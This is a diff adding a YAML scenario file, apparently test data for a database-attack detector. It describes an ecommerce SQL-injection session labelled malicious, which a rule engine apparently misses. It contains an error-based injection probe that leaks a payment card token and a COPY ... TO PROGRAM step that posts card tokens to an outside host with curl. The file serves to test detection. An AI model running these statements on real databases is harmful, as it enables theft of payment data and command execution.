@@ -1,0 +1,33 @@
+scenario_id: gen_ecommerce_94_sql_injection_mal_2911m
+family_id: gen_ecommerce_94_sql_injection_fam_2911
+domain: ecommerce
+time_of_day: 01:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT order_item_id, quantity FROM order_items WHERE order_id = CAST((SELECT
+      card_token FROM payments LIMIT 1) AS INTEGER)
+  - step_id: exfil
+    sql: COPY (SELECT card_token, card_last4 FROM payments) TO PROGRAM 'curl -sX POST
+      https://clearinghouse-batch.example/ingest -d @-'
+    connects_to:
+      ip: 45.77.55.54
+      port: 443
+matched_pair_id: gen_ecommerce_94_sql_injection_pair_2911
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
